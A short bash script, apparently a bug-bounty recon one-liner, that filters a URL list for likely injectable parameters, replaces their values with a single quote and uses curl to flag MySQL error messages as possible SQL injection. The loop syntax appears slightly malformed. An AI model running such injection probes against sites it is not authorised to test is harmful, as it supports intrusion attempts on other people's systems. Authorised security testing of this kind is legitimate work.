urlsFile=$1
cat $urlsFile | gf sqli | qsreplace "'" | while read host do; do curl --silent --insecure $host | egrep -qs "(mysql_fetch_array|SQL syntax)" && echo "[*] POSSIBLE SQL INJECTION HERE $host" ; done
